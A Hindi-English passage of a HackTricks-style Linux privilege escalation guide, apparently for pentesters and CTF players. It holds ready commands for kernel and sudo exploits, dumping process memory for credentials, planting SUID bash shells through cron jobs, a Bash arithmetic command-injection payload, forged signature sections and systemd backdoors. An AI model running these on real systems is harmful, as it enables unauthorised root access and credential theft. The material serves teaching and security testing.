# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में जानकारी इकट्ठा करना शुरू करें
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आप **`PATH` वेरिएबल के किसी भी फोल्डर में write permissions रखते हैं** तो आप कुछ libraries या binaries hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या कोई दिलचस्प जानकारी, passwords या API keys environment variables में हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel का version जाँचें और देखें कि कोई exploit है जो escalate privileges के लिए इस्तेमाल किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप एक अच्छी कमज़ोर kernel सूची और कुछ पहले से ही **compiled exploits** यहाँ पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी कमज़ोर kernel संस्करण निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
कर्नेल exploits खोजने में मदद करने वाले टूल:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **kernel version को Google में खोजें**, हो सकता है आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो सकेंगे कि यह exploit वैध है।

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो निम्न में दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके देख सकते हैं कि sudo version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के संस्करण (**1.9.14 - 1.9.17 < 1.9.17p1**) अनधिकृत लोकल उपयोगकर्ताओं को sudo `--chroot` विकल्प के माध्यम से root तक अपनी privileges बढ़ाने की अनुमति देते हैं जब `/etc/nsswitch.conf` फ़ाइल किसी user controlled डायरेक्टरी से उपयोग की जाती है।

यहाँ उस [vulnerability] को exploit करने के लिए एक [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) है। exploit चलाने से पहले सुनिश्चित करें कि आपका `sudo` संस्करण vulnerable है और यह `chroot` feature को सपोर्ट करता है।

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** पर इस **उदाहरण** में यह vuln कैसे exploited किया जा सकता है
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों को सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जांचें **what is mounted and unmounted**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करके निजी जानकारी के लिए जांच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही, जाँच करें कि **कोई compiler स्थापित है**। यह उपयोगी है अगर आपको कोई kernel exploit इस्तेमाल करना हो, क्योंकि यह अनुशंसा की जाती है कि इसे उस मशीन पर संकलित किया जाए जहाँ आप इसे उपयोग करने जा रहे हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर स्थापित

स्थापित पैकेज और सेवाओं के **संस्करण** की जाँच करें।  
शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जिसे exploited करके escalating privileges हासिल किए जा सकें…\  
अधिक संदेहास्पद स्थापित सॉफ़्टवेयर के संस्करण को मैन्युअली जाँचने की सिफारिश की जाती है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH एक्सेस है, तो आप मशीन में इंस्टॉल किए गए पुराने और vulnerable सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड्स बहुत सारी जानकारी दिखाएँगी जो ज्यादातर बेकार होगी, इसलिए OpenVAS या इसी तरह के किसी टूल का उपयोग करने की सलाह दी जाती है जो यह जाँच सके कि किसी इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण में ज्ञात exploits के लिए vulnerable तो नहीं है_

## प्रक्रियाएँ

देखें कि **कौन सी प्रक्रियाएँ** चल रही हैं और जाँचें कि कोई प्रक्रिया **अपेक्षित से अधिक privileges तो नहीं रखती** (शायद tomcat को root द्वारा चलाया जा रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) की जाँच करें। **Linpeas** उनको detect करता है process की command line के अंदर `--inspect` parameter चेक करके.\
साथ ही **processes के binaries पर अपने privileges भी चेक करें**, हो सकता है आप किसी को overwrite कर सकें।

### Process monitoring

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग processes को मॉनिटर करने के लिए कर सकते हैं। यह उन कमज़ोर processes को पहचानने में बहुत उपयोगी हो सकता है जो बार‑बार execute होते हैं या जब कुछ शर्तें पूरी होती हैं।

### Process memory

कुछ server services memory के अंदर **credentials को clear text में सेव** करती हैं।\
आम तौर पर आपको दूसरे users के processes की memory पढ़ने के लिए **root privileges** की आवश्यकता होगी, इसलिए यह आमतौर पर तब ज्यादा उपयोगी होता है जब आप पहले से root हों और और credentials खोजना चाहें।\
हालाँकि, याद रखें कि **एक सामान्य user के रूप में आप उन processes की memory पढ़ सकते हैं जो आपके हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकतर मशीनें **ptrace को default रूप से allow नहीं करतीं**, जिसका मतलब है कि आप अपने unprivileged user के अन्य processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की पहुँच नियंत्रित करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes debug किये जा सकते हैं, बशर्ते उनका uid समान हो। यह ptracing का पारंपरिक तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से trace नहीं किया जा सकता। एक बार सेट होने पर ptracing को पुनः सक्षम करने के लिए reboot आवश्यक है।

#### GDB

यदि आपके पास किसी FTP service (उदाहरण के लिए) की memory तक पहुँच है तो आप Heap निकाल कर उसके अंदर के credentials खोज सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps यह दिखाते हैं कि memory उस प्रक्रिया के virtual address space में कैसे mapped है**; यह **प्रत्येक mapped region के permissions** भी दिखाता है।  
**mem** pseudo फ़ाइल **process की memory को स्वयं उजागर करती है**। **maps** फ़ाइल से हमें पता चलता है कि कौन‑से **memory regions पढ़ने योग्य हैं** और उनके offsets क्या हैं। हम इन जानकारियों का उपयोग करके **mem file में seek कर के सभी पढ़ने योग्य regions को एक फ़ाइल में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी तक। कर्नेल के वर्चुअल एड्रेस स्पेस तक `/dev/kmem` का उपयोग करके पहुँच की जा सकती है.\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ने योग्य होता है.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के लिए Sysinternals सूट के क्लासिक ProcDump टूल का Linux पर पुनर्कल्पना है। इसे यहाँ प्राप्त करें: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल

Process memory को dump करने के लिए आप निम्न का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताओं को हटा सकते हैं और आपके स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root की आवश्यकता है)

### Process Memory से Credentials

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शनों को देखें ताकि process की memory dump करने के विभिन्न तरीके मिलें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी और कुछ प्रसिद्ध फ़ाइलों से **सादा-पाठ क्रेडेंशियल्स** चुराता है। इसे सही ढंग से काम करने के लिए root privileges चाहिए।

| फ़ीचर                                           | प्रोसेस नाम         |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## अनुसूचित/Cron jobs

### Crontab UI (alseambusher) root के रूप में चल रहा है – वेब-आधारित शेड्यूलर privesc

यदि वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चल रहा है और केवल loopback पर बाइंड है, तो आप SSH local port-forwarding के माध्यम से इसे एक्सेस कर सकते हैं और privesc के लिए एक privileged job बना सकते हैं।

आम प्रक्रिया
- `ss -ntlp` / `curl -v localhost:8000` के माध्यम से loopback-only पोर्ट (जैसे, 127.0.0.1:8000) और Basic-Auth realm खोजें
- ऑपरेशनल आर्टिफैक्ट्स में क्रेडेंशियल्स खोजें:
  - Backups/scripts जिनमें `zip -P <password>`
  - systemd unit जो `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` को एक्सपोज़ कर रहा हो
- टनेल और लॉगिन:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएं (SUID shell छोड़ता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित user और न्यूनतम permissions के साथ सीमित करें
- localhost से bind करें और अतिरिक्त रूप से access को firewall/VPN के माध्यम से सीमित करें; passwords का पुनः उपयोग न करें
- unit files में secrets embed करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँचें कि कोई scheduled job vulnerable तो नहीं है। शायद आप उस script का फायदा उठा सकें जिसे root द्वारा execute किया जा रहा है (wildcard vuln? क्या आप root द्वारा उपयोग की जाने वाली फ़ाइलें modify कर सकते हैं? symlinks का उपयोग? root जिस directory का उपयोग करता है उसमें specific files बना सकते हैं?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user के पास /home/user पर लिखने की अनुमतियाँ हैं_)

यदि इस crontab के अंदर root user PATH सेट किए बिना कोई command या script execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\  
तो, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि कोई script root द्वारा execute किया जाता है और किसी command के अंदर “**\***” हो, तो आप इसे exploit करके अनपेक्षित चीजें (जैसे privesc) करवा सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी पथ जैसे** _**/some/path/\***_ **के पहले आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है। अगर कोई root cron/parser untrusted log fields को पढ़कर उन्हें किसी arithmetic context में डालता है, तो attacker एक command substitution $(...) इंजेक्ट कर सकता है जो cron के चलते समय root के रूप में execute होता है।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, और फिर word splitting और pathname expansion। इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसे मान को पहले substitute किया जाता है (जिससे कमांड चलता है), फिर शेष numeric `0` arithmetic के लिए उपयोग होता है ताकि स्क्रिप्ट बिना error के जारी रहे।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log में attacker-controlled text लिखवाएं ताकि numeric-looking field में command substitution हो और वह digit पर खत्म हो। यह सुनिश्चित करें कि आपका कमांड stdout पर कुछ न प्रिंट करे (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप root द्वारा execute किए जाने वाले किसी **cron script** को modify कर सकते हैं, तो आप बहुत आसानी से shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
अगर root द्वारा चलाया गया script किसी ऐसी **directory where you have full access** का इस्तेमाल करता है, तो उस फ़ोल्डर को हटाकर और एक **symlink folder to another one** बना कर जिसमें आपका नियंत्रित script serve हो, यह उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### कस्टम-साइन किए गए cron binaries जिनमें writable payloads होते हैं
Blue teams कभी-कभार cron-driven binaries को "sign" करती हैं — एक custom ELF section को dump करके और vendor string के लिए grep करके — और फिर उन्हें root के रूप में execute करने से पहले जांचती हैं। अगर वह binary group-writable है (उदा., `/opt/AV/periodic-checks/monitor` जिसका मालिक `root:devs 770` है) और आप signing material को leak कर सकते हैं, तो आप section को forge करके cron task को hijack कर सकते हैं:

1. `pspy` का उपयोग करके verification flow को capture करें। उदाहरण में (Era), root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` और फिर फ़ाइल को execute किया।
2. प्रत्याशित certificate को recreate करें leaked key/config (from `signing.zip`) का उपयोग करके:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (उदा., SUID bash डालें, अपना SSH key जोड़ें) और certificate को `.text_sig` में embed करें ताकि grep पास हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits को preserve करते हुए scheduled binary को overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron run का इंतजार करें; जब naive signature check सफल हो जाएगा, आपका payload root के रूप में चलेगा।

### बार-बार चलने वाले cron jobs

आप processes को मॉनिटर कर सकते हैं ताकि आप ऐसे processes ढूंढ सकें जो हर 1, 2 या 5 मिनट पर execute हो रहे हों। शायद आप इसका फायदा उठा कर escalate privileges कर सकें।

उदाहरण के लिए, **1 मिनट के दौरान हर 0.1s पर मॉनिटर करने के लिए**, **कम चलाए गए commands के अनुसार sort करने के लिए** और सबसे अधिक बार चलाए गए commands को हटाने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर शुरू होने वाली process को monitor और list करेगा).

### अदृश्य cron jobs

यह संभव है कि आप एक cronjob **टिप्पणी के बाद carriage return डालकर** (बिना newline character के), और cron job काम करेगा। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फाइलें

जाँचें कि क्या आप कोई `.service` फाइल लिख सकते हैं, अगर हाँ तो आप **इसे संशोधित कर सकते हैं** ताकि यह **आपका backdoor execute करे** जब सेवा **started**, **restarted** या **stopped** हो (शायद आपको मशीन के reboot होने तक इंतजार करना पड़े).\
उदाहरण के लिए अपनी backdoor को .service फाइल के अंदर बनाकर **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि यदि आपके पास सेवाओं द्वारा चलाए जा रहे binaries पर **write permissions** हैं, तो आप उन्हें backdoors के रूप में बदल सकते हैं ताकि जब सेवाएँ फिर से चलें तो backdoors चल जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किया गया PATH निम्न कमांड से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाथ के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप संभवतः **escalate privileges** कर पाएंगे। आपको उन फ़ाइलों में **relative paths being used on service configurations** की खोज करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर एक **executable** बनाएं जिसे आप लिख सकते हैं और जिसका नाम **relative path binary** के समान हो, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, आपका **backdoor** execute हो जाएगा (unprivileged users आमतौर पर services को start/stop नहीं कर सकते लेकिन जांचें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**Learn more about services with `man systemd.service`.**

## **Timers**

**Timers** systemd के unit files होते हैं जिनका नाम `**.timer**` पर समाप्त होता है और जो `**.service**` files या events को control करते हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in समर्थन होता है और इन्हें asynchronously चलाया जा सकता है।

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं, तो आप उसे systemd.unit में मौजूद कुछ यूनिट्स (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> यह वही unit है जिसे यह timer समाप्त होने पर सक्रिय किया जाएगा. आर्गुमेंट एक unit नाम है, जिसका suffix ".timer" नहीं है. यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर डिफ़ॉल्ट होता है जिसका नाम timer unit के समान होता है, केवल suffix अलग होता है. (ऊपर देखें.) यह अनुशंसा की जाती है कि सक्रिय किए जाने वाले unit नाम और timer unit का unit नाम समान हों, केवल suffix अलग हो.

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को खोजें जो **एक writable binary चला रहा हो**
- किसी systemd unit को खोजें जो **एक relative path चला रहा हो** और आपके पास उस **systemd PATH** पर **writable privileges** हों (ताकि आप उस executable का impersonate कर सकें)

**Learn more about timers with `man systemd.timer`.**

### **Timer सक्षम करना**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** को सक्रिय करने के लिए `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर उसके लिए एक symlink बनाना होता है

## Sockets

Unix Domain Sockets (UDS) क्लाइंट‑सर्वर मॉडल के भीतर समान या अलग मशीनों पर **process communication** सक्षम करते हैं। ये इंटर‑कम्प्यूटर कम्युनिकेशन के लिए स्टैण्डर्ड Unix descriptor फाइलों का उपयोग करते हैं और `.socket` फाइलों के जरिए सेट अप होते हैं।

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**Learn more about sockets with `man systemd.socket`.** इस फाइल के अंदर कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग‑अलग हैं पर सारांश के रूप में ये बताने के लिए उपयोग होते हैं **कि यह किस पर सुनने वाला है** (AF_UNIX socket फाइल का पथ, IPv4/6 और/या सुनने का पोर्ट नंबर, आदि)
- `Accept`: एक boolean argument लेता है। अगर **true** है, तो **प्रति आने वाले कनेक्शन के लिए एक सेवा instance स्पॉन किया जाता है** और केवल कनेक्शन socket को ही उसे पास किया जाता है। अगर **false** है, तो सभी listening sockets स्वयं **स्टार्ट की गई service unit को पास किए जाते हैं**, और सभी कनेक्शनों के लिए केवल एक service unit स्पॉन होती है। इस मान को datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक ही service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को हैंडल करती है। **Defaults to false**. प्रदर्शन कारणों से, नए daemons को केवल `Accept=no` के अनुकूल तरीके से लिखने की सलाह दी जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के **बने और bind होने से पहले** या **बने और bind होने के बाद** क्रमशः **executed** किया जाता है। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के **बंद और हटाए जाने से पहले** या **बंद और हटाए जाने के बाद** क्रमशः **executed** होते हैं।
- `Service`: उस **service** unit का नाम निर्दिष्ट करता है **जिसे incoming traffic पर activate किया जाना है**। यह सेटिंग केवल Accept=no वाले sockets के लिए ही अनुमति है। यह डिफ़ॉल्ट रूप से उस service को चुनेगा जिसका नाम socket के समान होता है (suffix बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

